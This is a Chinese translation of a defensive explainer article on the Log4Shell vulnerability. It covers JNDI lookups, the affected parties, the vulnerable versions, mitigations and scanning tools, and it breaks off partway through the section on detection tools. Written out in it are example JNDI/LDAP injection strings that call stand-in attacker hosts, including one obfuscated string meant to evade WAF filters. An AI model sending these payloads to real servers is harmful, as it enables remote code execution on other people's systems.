<html>
<head>
<title>What’s the Hype With Log4j</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Log4j有什么炒作之处</h1>
<blockquote>原文：<a href="https://betterprogramming.pub/whats-the-hype-with-log4j-2de7a64f221?source=collection_archive---------2-----------------------#2021-12-21">https://betterprogramming.pub/whats-the-hype-with-log4j-2de7a64f221?source=collection_archive---------2-----------------------#2021-12-21</a></blockquote><div><div class="fc ii ij ik il im"/><div class="in io ip iq ir"><h2 id="fe21" class="is it iu bd b dl iv iw ix iy iz ja dk jb translated" aria-label="kicker paragraph">网络安全</h2><div class=""/><div class=""><h2 id="fe84" class="pw-subtitle-paragraph ka jd iu bd b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr dk translated">以下是您应该了解的零日漏洞log4shell(最严重的网络安全漏洞之一)，以及如何降低您遭受攻击的风险</h2></div><figure class="kt ku kv kw gu kx gi gj paragraph-image"><div role="button" tabindex="0" class="ky kz di la bf lb"><div class="gi gj ks"><img src="../Images/7b07d8cfb61d1fc65e756e70ec056830.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XXQixyynFgvdF9CsLBgj5A.jpeg"/></div></div><p class="le lf gk gi gj lg lh bd b be z dk translated"><a class="ae li" href="https://unsplash.com/@flyd2069?utm_source=medium&amp;utm_medium=referral" rel="noopener ugc nofollow" target="_blank">飞:D </a>在<a class="ae li" href="https://unsplash.com?utm_source=medium&amp;utm_medium=referral" rel="noopener ugc nofollow" target="_blank"> Unsplash </a>上的照片(作者编辑)</p></figure><p id="3ec7" class="pw-post-body-paragraph lj lk iu ll b lm ln ke lo lp lq kh lr ls lt lu lv lw lx ly lz ma mb mc md me in bi translated">随着我们接近年底，许多人都在为假期做准备，这段时间对管理员、安全专家以及攻击者来说，意味着除了平静的日子之外的任何日子。他们都在世界各地加班加点甚至不眠不休，因为同一个原因，但为了不同的目标。</p><p id="4628" class="pw-post-body-paragraph lj lk iu ll b lm ln ke lo lp lq kh lr ls lt lu lv lw lx ly lz ma mb mc md me in bi translated">2021年12月9日，Apache在Java日志库Log4j中披露了一个名为Log4Shell的零日漏洞，从那以后这个话题就上了头条。</p><p id="3c95" class="pw-post-body-paragraph lj lk iu ll b lm ln ke lo lp lq kh lr ls lt lu lv lw lx ly lz ma mb mc md me in bi translated">一些专家将其描述为长期以来最严重的安全漏洞之一，因为它允许<a class="ae li" href="https://www.wallarm.com/what/the-concept-of-rce-remote-code-execution-attack" rel="noopener ugc nofollow" target="_blank">远程代码执行(RCE) </a>，并且很容易被利用。其他人认为，Log4Shell将在互联网上困扰多年，然后才能收拾残局。</p><p id="6552" class="pw-post-body-paragraph lj lk iu ll b lm ln ke lo lp lq kh lr ls lt lu lv lw lx ly lz ma mb mc md me in bi translated">几天前，Apache发布了一个针对漏洞的紧急更新,该漏洞被标识为<a class="ae li" href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228" rel="noopener ugc nofollow" target="_blank">CVE-2021–44228</a>,并在<a class="ae li" href="https://www.first.org/cvss/" rel="noopener ugc nofollow" target="_blank"> CVSS等级</a>中被评定为最严重的10级,第二个被跟踪为<a class="ae li" href="https://nvd.nist.gov/vuln/detail/CVE-2021-45046" rel="noopener ugc nofollow" target="_blank">CVE-2021–45046</a>的更新也与公众分享，同时还提供了一个新的补丁。</p><p id="3f7d" class="pw-post-body-paragraph lj lk iu ll b lm ln ke lo lp lq kh lr ls lt lu lv lw lx ly lz ma mb mc md me in bi translated">我不记得我第一次使用Log4j是什么时候，但那是很久以前的事了，就像成千上万的Java开发人员将这个库导入到他们的代码库中一样，我非常信任这个事实上的日志记录解决方案，我从来没有想到有一天它会引起这样的噪音或这样的麻烦。</p><p id="75ec" class="pw-post-body-paragraph lj lk iu ll b lm ln ke lo lp lq kh lr ls lt lu lv lw lx ly lz ma mb mc md me in bi translated">是的，我知道，对于一个局外人来说，这可能听起来很疯狂，这样一个庞大的部落在他们的代码库中盲目地使用这个包，但我认为弗里德里希·尼采对疯狂有一个有趣的描述，适合这种情况:</p><blockquote class="mf"><p id="27bf" class="mg mh iu bd mi mj mk ml mm mn mo me dk translated">“疯狂在个人身上是罕见的，但在团体、党派、民族和时代，这是规律。”</p></blockquote><p id="c4fd" class="pw-post-body-paragraph lj lk iu ll b lm mp ke lo lp mq kh lr ls mr lu lv lw ms ly lz ma mt mc md me in bi translated">在你责备我之前，让我告诉你，至少我不是那个把图书馆介绍给我工作的项目的人😁。</p><p id="f9c7" class="pw-post-body-paragraph lj lk iu ll b lm ln ke lo lp lq kh lr ls lt lu lv lw lx ly lz ma mb mc md me in bi translated">无论如何，我感觉被这个消息触发了，并结束了花大量时间搜索和了解它以及它对现在和未来的意义。在本帖中，我将分解关于这个话题你需要知道的内容，并回答一堆重要的问题。</p><pre class="kt ku kv kw gu mu mv mw mx aw my bi"><span id="d343" class="mz na iu mv b gz nb nc l nd ne"><strong class="mv je">Table of Contents</strong></span><span id="3d60" class="mz na iu mv b gz nf nc l nd ne"><a class="ae li" href="#f8e5" rel="noopener ugc nofollow"><strong class="mv je">What Is Log4Shell?</strong></a><br/>   ∘ <a class="ae li" href="#1ef3" rel="noopener ugc nofollow">What Is JNDI?</a><br/>   ∘ <a class="ae li" href="#de24" rel="noopener ugc nofollow">Filter and block</a><strong class="mv je"><br/></strong><a class="ae li" href="#fa71" rel="noopener ugc nofollow"><strong class="mv je">Why Addressing Log4Shell is Challenging?</strong></a><strong class="mv je"><br/></strong><a class="ae li" href="#5afa" rel="noopener ugc nofollow"><strong class="mv je">Who Is Affected by Log4Shell?</strong></a><br/>   ∘ <a class="ae li" href="#d67a" rel="noopener ugc nofollow">Companies</a><br/>   ∘ <a class="ae li" href="#2c88" rel="noopener ugc nofollow">Home users</a><br/>   ∘ <a class="ae li" href="#876c" rel="noopener ugc nofollow">Security systems</a><strong class="mv je"><br/></strong><a class="ae li" href="#aa35" rel="noopener ugc nofollow"><strong class="mv je">Which Log4j Versions Are Vulnerable?</strong></a><br/><a class="ae li" href="#d819" rel="noopener ugc nofollow"><strong class="mv je">How to Find Out if You’re Using Log4j?</strong></a><br/>   ∘ <a class="ae li" href="#2bc2" rel="noopener ugc nofollow">Syft</a><br/>   ∘ <a class="ae li" href="#ea92" rel="noopener ugc nofollow">Grype</a><br/>   ∘ <a class="ae li" href="#6d45" rel="noopener ugc nofollow">Log4Shell Bytecode Detector</a><strong class="mv je"><br/></strong><a class="ae li" href="#494e" rel="noopener ugc nofollow"><strong class="mv je">Final Thought</strong></a></span></pre><p id="0195" class="pw-post-body-paragraph lj lk iu ll b lm ln ke lo lp lq kh lr ls lt lu lv lw lx ly lz ma mb mc md me in bi translated">在我们开始之前，如果你还没有看到下面这张图，没有比现在更好的时间来看它了。</p><p id="5656" class="pw-post-body-paragraph lj lk iu ll b lm ln ke lo lp lq kh lr ls lt lu lv lw lx ly lz ma mb mc md me in bi translated">我觉得这很有意义，因为尽管Apache日志服务在技术领域很重要，但实际上负责这项服务的团队是由分布在世界各地的16名<strong class="ll je">自愿无偿开发人员</strong>组成的:</p><figure class="kt ku kv kw gu kx gi gj paragraph-image"><div role="button" tabindex="0" class="ky kz di la bf lb"><div class="gi gj ng"><img src="../Images/9530768df5666fac5bb7acf0cbd771bd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ROX9IH_Sz4-I45G6dfSqCg.jpeg"/></div></div><p class="le lf gk gi gj lg lh bd b be z dk translated"><a class="ae li" href="https://github.com/YfryTchsGD/Log4jAttackSurface/blob/master/MEME/0.jpg" rel="noopener ugc nofollow" target="_blank">来源</a></p></figure><h1 id="f8e5" class="nh na iu bd ni nj nk nl nm nn no np nq kj nr kk ns km nt kn nu kp nv kq nw nx bi translated">Log4Shell是什么？</h1><p id="816e" class="pw-post-body-paragraph lj lk iu ll b lm ny ke lo lp nz kh lr ls oa lu lv lw ob ly lz ma oc mc md me in bi translated">Log4j库在Java领域广泛用于记录事件或错误。当我们试图将一个被操纵的请求发送到日志中时，问题就出现了。</p><p id="2622" class="pw-post-body-paragraph lj lk iu ll b lm ln ke lo lp lq kh lr ls lt lu lv lw lx ly lz ma mb mc md me in bi translated"><a class="ae li" href="https://github.com/0x0021h/apache-log4j-rce/blob/main/poc/src/main/java/log4j.java" rel="noopener ugc nofollow" target="_blank"> pen测试小组0x0021h分享了一个概念验证代码(PoC) </a>，展示了攻击者如何通过向易受攻击的服务器或应用程序发送类似<code class="fe od oe of mv b">${jndi:ldap://127.0.0.1:1389/a}</code>的消息来利用这一安全漏洞，如下所示:</p><figure class="kt ku kv kw gu kx"><div class="bz fq l di"><div class="og oh l"/></div><p class="le lf gk gi gj lg lh bd b be z dk translated">Log4Shell的概念验证(log4j库中的零日漏洞)</p></figure><p id="abcf" class="pw-post-body-paragraph lj lk iu ll b lm ln ke lo lp lq kh lr ls lt lu lv lw lx ly lz ma mb mc md me in bi translated">目录服务JNDI (Java命名和目录接口)然后将联系LDAP(轻量级目录访问协议)服务器<code class="fe od oe of mv b">127.0.0.1:1389</code>，并且在从它那里接收到诸如潜在恶意Java类的数据之后，它将执行它们。</p><p id="3cce" class="pw-post-body-paragraph lj lk iu ll b lm ln ke lo lp lq kh lr ls lt lu lv lw lx ly lz ma mb mc md me in bi translated">攻击者还可以准备一个恶意的Java文件，并将其作为字符串包含在将要记录的任何数据中:</p><pre class="kt ku kv kw gu mu mv mw mx aw my bi"><span id="1b21" class="mz na iu mv b gz nb nc l nd ne">${jndi:ldap://attackers-server.com/<strong class="mv je">malicious-java-file</strong>}</span></pre><p id="f1d7" class="pw-post-body-paragraph lj lk iu ll b lm ln ke lo lp lq kh lr ls lt lu lv lw lx ly lz ma mb mc md me in bi translated">当易受攻击的服务器记录该字符串时，Log4j将从攻击者控制的服务器中检索并执行Java代码。如果代码是远程外壳，攻击者将以运行易受攻击的应用程序的系统用户的权限获得本地外壳。因此，该漏洞被称为<strong class="ll je"> Log4Shell </strong>，意思是:</p><blockquote class="mf"><p id="d955" class="mg mh iu bd mi mj mk ml mm mn mo me dk translated">"登录以便直接访问系统."</p></blockquote><figure class="oj ok ol om on kx gi gj paragraph-image"><div role="button" tabindex="0" class="ky kz di la bf lb"><div class="gi gj oi"><img src="../Images/0e1b23a2064eb986acd41c7da7fe76c3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*mJ8JT8kqscd7_dmw3ewZWQ.png"/></div></div><p class="le lf gk gi gj lg lh bd b be z dk translated">log4shell是如何工作的？(<a class="ae li" href="https://www.youtube.com/watch?v=RqdtEvW3_Wo" rel="noopener ugc nofollow" target="_blank">来源</a>，作者译)</p></figure><h2 id="1ef3" class="mz na iu bd ni oo op dn nm oq or dp nq ls os ot ns lw ou ov nu ma ow ox nw ja bi translated">什么是JNDI？</h2><p id="03f6" class="pw-post-body-paragraph lj lk iu ll b lm ny ke lo lp nz kh lr ls oa lu lv lw ob ly lz ma oc mc md me in bi translated">JNDI(或目录查找)是Java中的一个目录查找系统。它允许我们从网络上读取配置，而不是将其打包到Java应用程序中，然后在生产中安装这些包。</p><figure class="kt ku kv kw gu kx gi gj paragraph-image"><div class="gi gj oy"><img src="../Images/a4b39006c8a5e7c822694218d947a040.png" data-original-src="https://miro.medium.com/v2/resize:fit:782/0*B8bwlIrilaYNNEfw.gif"/></div><p class="le lf gk gi gj lg lh bd b be z dk translated">JNDI的建筑(<a class="ae li" href="https://docs.oracle.com/javase/tutorial/jndi/overview/index.html" rel="noopener ugc nofollow" target="_blank">来源</a></p></figure><p id="1309" class="pw-post-body-paragraph lj lk iu ll b lm ln ke lo lp lq kh lr ls lt lu lv lw lx ly lz ma mb mc md me in bi translated">多亏了JNDI SPI(服务提供者接口),您可以让LDAP服务器提供Java类文件，当您请求打印机时，它可以生成一个打印机对象。然而，这个特性允许安装恶意的东西，而不是交付假定的打印机对象。</p><figure class="kt ku kv kw gu kx gi gj paragraph-image"><div role="button" tabindex="0" class="ky kz di la bf lb"><div class="gi gj oz"><img src="../Images/38f0d1773409b0b66923565a7b4db436.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*3GU0ZRybzl1wffqkhgxReA.png"/></div></div><p class="le lf gk gi gj lg lh bd b be z dk translated">Java对象支持(<a class="ae li" href="https://docs.oracle.com/javase/tutorial/jndi/overview/event.html" rel="noopener ugc nofollow" target="_blank">来源</a>)</p></figure><p id="a348" class="pw-post-body-paragraph lj lk iu ll b lm ln ke lo lp lq kh lr ls lt lu lv lw lx ly lz ma mb mc md me in bi translated">加密矿工或危险的后门程序(如Cobalt Strike Beacons)可以使用此功能来利用易受攻击的系统。</p><blockquote class="pa pb pc"><p id="2be2" class="lj lk pd ll b lm ln ke lo lp lq kh lr pe lt lu lv pf lx ly lz pg mb mc md me in bi translated">“Cobalt Strike是一款付费渗透测试产品，允许攻击者在受害机器上部署名为‘Beacon’的代理。”— <a class="ae li" href="https://malpedia.caad.fkie.fraunhofer.de/details/win.cobalt_strike" rel="noopener ugc nofollow" target="_blank">马尔佩迪亚</a></p></blockquote><h2 id="de24" class="mz na iu bd ni oo op dn nm oq or dp nq ls os ot ns lw ou ov nu ma ow ox nw ja bi translated">过滤并阻止</h2><p id="a5b0" class="pw-post-body-paragraph lj lk iu ll b lm ny ke lo lp nz kh lr ls oa lu lv lw ob ly lz ma oc mc md me in bi translated">作为防止攻击易受攻击系统的解决方案，您可能会考虑使用web应用程序防火墙(WAF)来过滤、识别和阻止包含危险字符串的请求。</p><p id="a37b" class="pw-post-body-paragraph lj lk iu ll b lm ln ke lo lp lq kh lr ls lt lu lv lw lx ly lz ma mb mc md me in bi translated">但这种方法的问题是，有许多方法可以逃避它。攻击者可以通过使用正则表达式或编写如下请求进行伪装，以绕过所有过滤器并成功触发攻击:</p><pre class="kt ku kv kw gu mu mv mw mx aw my bi"><span id="f06d" class="mz na iu mv b gz nb nc l nd ne">${${<strong class="mv je">env:ENVNAME:-j</strong>}ndi${<strong class="mv je">env:ENVNAME:-:</strong>}${<strong class="mv je">env:ENVNAME:-l</strong>}dap${<strong class="mv je">env:ENVNAME:-:</strong>}//attacker.com/a}</span></pre><p id="7286" class="pw-post-body-paragraph lj lk iu ll b lm ln ke lo lp lq kh lr ls lt lu lv lw lx ly lz ma mb mc md me in bi translated">这种做法的另一个缺点是，它可能会阻止<strong class="ll je"> <em class="pd">无害的</em> </strong>用户。</p><p id="adc6" class="pw-post-body-paragraph lj lk iu ll b lm ln ke lo lp lq kh lr ls lt lu lv lw lx ly lz ma mb mc md me in bi translated">Cloudflare目前正试图通过阻止浏览器显示可疑用户代理的请求来保护其客户，如下例所示:</p><p id="401e" class="pw-post-body-paragraph lj lk iu ll b lm ln ke lo lp lq kh lr ls lt lu lv lw lx ly lz ma mb mc md me in bi translated">当我试图使用<a class="ae li" href="https://searchenginereports.net/plagiarism-checker" rel="noopener ugc nofollow" target="_blank">这里提供的抄袭检查器</a>来扫描包含字符串<code class="fe od oe of mv b">${jndi:ldap://127.0.0.1:1389/a}</code>的文本抄袭时，应用程序阻止了我，正如你在下面的截图中看到的:</p><figure class="kt ku kv kw gu kx gi gj paragraph-image"><div role="button" tabindex="0" class="ky kz di la bf lb"><div class="gi gj ph"><img src="../Images/3aaa6e905a02ee61eb9bccf28273198c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lpAYYiv30f-C75uznsonkA.png"/></div></div><p class="le lf gk gi gj lg lh bd b be z dk translated">如果Cloudflare将其解释为Log4Shell攻击，则会阻止对客户网站的访问。(作者截图)</p></figure><h1 id="fa71" class="nh na iu bd ni nj nk nl nm nn no np nq kj nr kk ns km nt kn nu kp nv kq nw nx bi translated">为什么解决Log4Shell问题具有挑战性？</h1><p id="5d62" class="pw-post-body-paragraph lj lk iu ll b lm ny ke lo lp nz kh lr ls oa lu lv lw ob ly lz ma oc mc md me in bi translated">即使您或您的团队编写的Java代码不使用Log4j，这也不意味着您的应用程序不包含易受攻击的库实例。这些实例可能隐藏在您项目中使用的包或框架中的某个地方，而您甚至不知道。</p><p id="3009" class="pw-post-body-paragraph lj lk iu ll b lm ln ke lo lp lq kh lr ls lt lu lv lw lx ly lz ma mb mc md me in bi translated"><strong class="ll je"> Struts </strong>、<strong class="ll je"> Hadoop </strong>、<strong class="ll je"> Elasticsearch </strong>、<strong class="ll je"> Grails </strong>和<strong class="ll je"> Kafka </strong>只是几个流行的Java框架和包的例子，它们被成千上万的企业应用程序(如果不是数百万的应用程序和服务)所使用，猜猜怎么着……它们也在使用Log4j。</p><p id="6149" class="pw-post-body-paragraph lj lk iu ll b lm ln ke lo lp lq kh lr ls lt lu lv lw lx ly lz ma mb mc md me in bi translated">如果您的代码将漏洞深深地嵌入了几层(一个嵌套在JAR中的JAR，一个嵌套在JAR中的JAR)，仅仅检查您的Java档案(JAR)是不够的。您还需要调查所有嵌套的。</p><figure class="kt ku kv kw gu kx gi gj paragraph-image"><div class="gi gj pi"><img src="../Images/828082ef070b88016d5bdd34c5d9c08b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1254/format:webp/0*0tm7GUEaWbiAocO7.png"/></div><p class="le lf gk gi gj lg lh bd b be z dk translated">利用易受攻击的log4j作为间接依赖<strong class="bd pj"> </strong>(来源:<a class="ae li" href="https://security.googleblog.com/2021/12/understanding-impact-of-apache-log4j.html" rel="noopener ugc nofollow" target="_blank">谷歌</a>)</p></figure><p id="b510" class="pw-post-body-paragraph lj lk iu ll b lm ln ke lo lp lq kh lr ls lt lu lv lw lx ly lz ma mb mc md me in bi translated">根据<a class="ae li" href="https://security.googleblog.com/2021/12/understanding-impact-of-apache-log4j.html" rel="noopener ugc nofollow" target="_blank">谷歌</a>的说法，超过35，000个Java包，占Maven中央存储库的8%以上，是易受攻击的，其中大多数都有log4j作为间接依赖。</p><h1 id="5afa" class="nh na iu bd ni nj nk nl nm nn no np nq kj nr kk ns km nt kn nu kp nv kq nw nx bi translated">Log4Shell对谁有影响？</h1><h2 id="d67a" class="mz na iu bd ni oo op dn nm oq or dp nq ls os ot ns lw ou ov nu ma ow ox nw ja bi translated">公司</h2><p id="3a5d" class="pw-post-body-paragraph lj lk iu ll b lm ny ke lo lp nz kh lr ls oa lu lv lw ob ly lz ma oc mc md me in bi translated">Log4Shell已经影响了许多互联网服务和数千家公司。</p><p id="5780" class="pw-post-body-paragraph lj lk iu ll b lm ln ke lo lp lq kh lr ls lt lu lv lw lx ly lz ma mb mc md me in bi translated">在GitHub上，有一个远非完整的<a class="ae li" href="https://github.com/YfryTchsGD/Log4jAttackSurface" rel="noopener ugc nofollow" target="_blank">列表，列出了在其系统中使用易受攻击的log4j的最知名公司</a>。列表包括<strong class="ll je"> <em class="pd">亚马逊</em></strong><strong class="ll je"><em class="pd">苹果</em></strong><strong class="ll je"><em class="pd">LinkedIn</em></strong><strong class="ll je"><em class="pd">cloud flare</em></strong><strong class="ll je"><em class="pd">谷歌</em></strong><strong class="ll je"><em class="pd">IBM</em></strong><strong class="ll je"><em class="pd">特斯拉</em></strong><strong class="ll je"><em class="pd">推特【推特</em></strong></p><p id="3463" class="pw-post-body-paragraph lj lk iu ll b lm ln ke lo lp lq kh lr ls lt lu lv lw lx ly lz ma mb mc md me in bi translated"><strong class="ll je"> <em class="pd">微软</em> </strong>也看到了安装硬币矿工，钴罢工，使凭据盗窃和横向移动，以及从受损系统中渗透数据。</p><blockquote class="pa pb pc"><p id="6bcb" class="lj lk pd ll b lm ln ke lo lp lq kh lr pe lt lu lv pf lx ly lz pg mb mc md me in bi translated">“根据12月11日至12月15日期间收集的遥测数据，仅德国和美国就占了所有利用企图的60%。观察期内最常见的攻击目标是美国、加拿大、英国、罗马尼亚、德国、澳大利亚、法国、荷兰、巴西和意大利。”— <a class="ae li" href="https://thehackernews.com/2021/12/new-local-attack-vector-expands-attack.html" rel="noopener ugc nofollow" target="_blank">黑客新闻</a></p></blockquote><div class="kt ku kv kw gu ab cb"><figure class="pk kx pl pm pn po pp paragraph-image"><div role="button" tabindex="0" class="ky kz di la bf lb"><img src="../Images/91b8f54273f9940588c2e9eaff53bd2a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1004/format:webp/1*PF8WTFDPJma-0zvgbToBwQ.png"/></div></figure><figure class="pk kx pq pm pn po pp paragraph-image"><div role="button" tabindex="0" class="ky kz di la bf lb"><img src="../Images/c42625f1b37fc682247102276df72ac4.png" data-original-src="https://miro.medium.com/v2/resize:fit:998/format:webp/1*A5qhrhoyrYjLH6XnCB0oMg.png"/></div><p class="le lf gk gi gj lg lh bd b be z dk pr di ps pt translated">超过50%的攻击利用Tor匿名服务来掩盖其真实来源(<a class="ae li" href="https://businessinsights.bitdefender.com/log4shell-the-call-is-coming-from-inside-the-house" rel="noopener ugc nofollow" target="_blank">来源</a>)</p></figure></div><h2 id="2c88" class="mz na iu bd ni oo op dn nm oq or dp nq ls os ot ns lw ou ov nu ma ow ox nw ja bi translated">家庭用户</h2><p id="3ef9" class="pw-post-body-paragraph lj lk iu ll b lm ny ke lo lp nz kh lr ls oa lu lv lw ob ly lz ma oc mc md me in bi translated">Log4Shell不仅威胁大公司和小公司，还威胁私人个人和家庭办公室的员工，以及易受攻击的物联网设备的最终用户。</p><p id="55e3" class="pw-post-body-paragraph lj lk iu ll b lm ln ke lo lp lq kh lr ls lt lu lv lw lx ly lz ma mb mc md me in bi translated">例如，Ubiquiti是一家在家庭用户中主要以其可网格化的WLAN接入点而闻名的美国技术公司，它承认<a class="ae li" href="https://community.ui.com/releases/UniFi-Network-Application-6-5-54/d717f241-48bb-4979-8b10-99db36ddabe1" rel="noopener ugc nofollow" target="_blank">其配置和管理前端UniFi网络应用程序存在漏洞，并为其提供了更新</a>。</p><p id="62d7" class="pw-post-body-paragraph lj lk iu ll b lm ln ke lo lp lq kh lr ls lt lu lv lw lx ly lz ma mb mc md me in bi translated">这意味着，由于新冠肺炎病毒，员工目前在家工作的公司以及使用私人电脑通过VPN连接到公司内部网络的公司面临风险。</p><p id="0722" class="pw-post-body-paragraph lj lk iu ll b lm ln ke lo lp lq kh lr ls lt lu lv lw lx ly lz ma mb mc md me in bi translated">许多酒店、商店、银行、医疗机构和小公司也使用UniFi网络应用程序，通过访客WLAN使用优惠券为访客提供互联网接入。</p><p id="2aa3" class="pw-post-body-paragraph lj lk iu ll b lm ln ke lo lp lq kh lr ls lt lu lv lw lx ly lz ma mb mc md me in bi translated">其他网络产品制造商也可能受到影响，但他们可能宁愿保持沉默。</p><h2 id="876c" class="mz na iu bd ni oo op dn nm oq or dp nq ls os ot ns lw ou ov nu ma ow ox nw ja bi translated">安全系统</h2><p id="4b22" class="pw-post-body-paragraph lj lk iu ll b lm ny ke lo lp nz kh lr ls oa lu lv lw ob ly lz ma oc mc md me in bi translated">Java广泛应用于访问系统，如数字锁系统、自动化技术和智能家居，这增加了受log4j安全缺陷影响的产品数量。</p><p id="cb0f" class="pw-post-body-paragraph lj lk iu ll b lm ln ke lo lp lq kh lr ls lt lu lv lw lx ly lz ma mb mc md me in bi translated"><a class="ae li" href="https://www.youtube.com/watch?v=MMwUF4sHmBQ" rel="noopener ugc nofollow" target="_blank">思科自己</a>报告称其思科视频监控运营管理器也易受攻击。</p><figure class="kt ku kv kw gu kx gi gj paragraph-image"><div role="button" tabindex="0" class="ky kz di la bf lb"><div class="gi gj pu"><img src="../Images/7259e04ee932cbdd6bcfa7f13207369e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*qxc0cB1eYNK7nvn0.png"/></div></div><p class="le lf gk gi gj lg lh bd b be z dk translated"><strong class="bd pj">对log4j漏洞中的暗网很感兴趣:</strong> <em class="pv">一段来自Invidious的视频——暗网视频流媒体平台，类似于YouTube。2021年12月16日此视频有</em> <strong class="bd pj"> <em class="pv"> 200K+浏览量</em> </strong> <em class="pv">和关于</em> <strong class="bd pj"> <em class="pv"> 1500评论</em> </strong> <em class="pv">。(</em> <a class="ae li" href="https://businessinsights.bitdefender.com/log4shell-the-call-is-coming-from-inside-the-house" rel="noopener ugc nofollow" target="_blank"> <em class="pv">来源</em> </a> <em class="pv"> ) </em></p></figure><h1 id="aa35" class="nh na iu bd ni nj nk nl nm nn no np nq kj nr kk ns km nt kn nu kp nv kq nw nx bi translated">哪些Log4j版本易受攻击？</h1><p id="4cf3" class="pw-post-body-paragraph lj lk iu ll b lm ny ke lo lp nz kh lr ls oa lu lv lw ob ly lz ma oc mc md me in bi translated">2.17版之前的Log4j版不安全。在<a class="ae li" href="https://lists.apache.org/thread/d6v4r6nosxysyq9rvnr779336yf0woz4" rel="noopener ugc nofollow" target="_blank">版本2.16.0 </a>中，阿帕奇开发者改进了保护措施，彻底停用了JNDI。但是用户可以手动再次打开它，这在无保护的环境中代表了高安全风险。</p><p id="92e6" class="pw-post-body-paragraph lj lk iu ll b lm ln ke lo lp lq kh lr ls lt lu lv lw lx ly lz ma mb mc md me in bi translated">属于1.x分支的旧版本不再提供更新(生命周期结束),它们因不同于Log4Shell的其他漏洞而为人所知。</p><p id="b6e8" class="pw-post-body-paragraph lj lk iu ll b lm ln ke lo lp lq kh lr ls lt lu lv lw lx ly lz ma mb mc md me in bi translated">如果在您的情况下无法更新到新版本的库，并且您的Log4j版本高于或等于2.10，您可以通过将变量<code class="fe od oe of mv b">log4j2.formatMsgNoLookups</code>设置为<code class="fe od oe of mv b">true</code>来保护易受攻击的服务。为此，使用参数<code class="fe od oe of mv b">–<strong class="ll je">Dlog4j2.formatMsgNoLookups=True</strong></code>启动Java虚拟机，或者设置环境变量<code class="fe od oe of mv b"><strong class="ll je">LOG4J_FORMAT_MSG_NO_LOOKUPS=true</strong></code>。</p><p id="05b6" class="pw-post-body-paragraph lj lk iu ll b lm ln ke lo lp lq kh lr ls lt lu lv lw lx ly lz ma mb mc md me in bi translated">对于旧版本，建议使用以下命令删除<code class="fe od oe of mv b">JndiLookup</code>类作为缓解:</p><pre class="kt ku kv kw gu mu mv mw mx aw my bi"><span id="9869" class="mz na iu mv b gz nb nc l nd ne"><strong class="mv je">zip -q -d log4j-core-*.jar</strong></span><span id="f5e6" class="mz na iu mv b gz nf nc l nd ne"><strong class="mv je">org/apache/logging/log4j/core/lookup/JndiLookup.class</strong></span></pre><p id="75f3" class="pw-post-body-paragraph lj lk iu ll b lm ln ke lo lp lq kh lr ls lt lu lv lw lx ly lz ma mb mc md me in bi translated">以下是<a class="ae li" href="https://thehackernews.com/2021/12/new-local-attack-vector-expands-attack.html" rel="noopener ugc nofollow" target="_blank">过去两周</a>报告的缺陷列表:</p><ul class=""><li id="cab3" class="pw px iu ll b lm ln lp lq ls py lw pz ma qa me qb qc qd qe bi translated"><a class="ae li" href="https://thehackernews.com/2021/12/extremely-critical-log4j-vulnerability.html" rel="noopener ugc nofollow" target="_blank"><strong class="ll je">CVE-2021–44228</strong></a>(已在2.15.0版本中修复)<strong class="ll je"> : </strong>它导致远程代码执行漏洞，影响从2.0-beta9到2.14.1的Log4j版本。</li><li id="e8f1" class="pw px iu ll b lm qf lp qg ls qh lw qi ma qj me qb qc qd qe bi translated"><a class="ae li" href="https://thehackernews.com/2021/12/second-log4j-vulnerability-cve-2021.html" rel="noopener ugc nofollow" target="_blank"><strong class="ll je">CVE-2021–45046</strong></a>(在2.16.0版本中修复)<strong class="ll je"> : </strong>导致信息泄露和远程代码执行漏洞，影响Log4j版本从2.0-beta9到2.15.0，不包括2.12.2。</li><li id="e7bf" class="pw px iu ll b lm qf lp qg ls qh lw qi ma qj me qb qc qd qe bi translated"><a class="ae li" href="https://nvd.nist.gov/vuln/detail/CVE-2021-45105" rel="noopener ugc nofollow" target="_blank"><strong class="ll je">CVE-2021–45105</strong></a>(已在2.17.0版本中修复)<strong class="ll je"> : </strong>一个拒绝服务漏洞，影响Log4j版本从2.0-beta9到2.16.0。</li><li id="87c4" class="pw px iu ll b lm qf lp qg ls qh lw qi ma qj me qb qc qd qe bi translated"><a class="ae li" href="https://nvd.nist.gov/vuln/detail/CVE-2021-4104" rel="noopener ugc nofollow" target="_blank"><strong class="ll je">CVE-2021–4104</strong></a>(没有可用的修复程序；升级至2.17.0版)<strong class="ll je"> : </strong>一个影响Log4j版的不可信反序列化缺陷。</li></ul><h1 id="d819" class="nh na iu bd ni nj nk nl nm nn no np nq kj nr kk ns km nt kn nu kp nv kq nw nx bi translated">如何发现自己用的是不是Log4j？</h1><p id="bf1c" class="pw-post-body-paragraph lj lk iu ll b lm ny ke lo lp nz kh lr ls oa lu lv lw ob ly lz ma oc mc md me in bi translated">要查明您的应用程序是否使用了易受攻击的Log4j版本，您需要扫描您的JAR文件和JAR档案的嵌套层。好消息是，您不需要手动挖掘依赖关系树的底部来识别是否有Log4j的易受攻击的实例隐藏在某个地方。</p><p id="75e2" class="pw-post-body-paragraph lj lk iu ll b lm ln ke lo lp lq kh lr ls lt lu lv lw lx ly lz ma mb mc md me in bi translated">有开源工具可以扫描大量打包的依赖格式，检查它们的存在，并报告它们是否包含Syft和Grype等漏洞<a class="ae li" href="https://anchore.com/" rel="noopener ugc nofollow" target="_blank"> anchore </a>。</p><h2 id="2bc2" class="mz na iu bd ni oo op dn nm oq or dp nq ls os ot ns lw ou ov nu ma ow ox nw ja bi translated">Syft</h2><p id="e4e7" class="pw-post-body-paragraph lj lk iu ll b lm ny ke lo lp nz kh lr ls oa lu lv lw ob ly lz ma oc mc md me in bi translated">Syft 生成SBOM(软件物料清单)。它能够确定Java应用程序包含哪个版本的Log4j。</p><figure class="kt ku kv kw gu kx gi gj paragraph-image"><div role="button" tabindex="0" class="ky kz di la bf lb"><div class="gi gj qk"><img src="../Images/28486f23674d895e8f1d05010b7f544b.png" 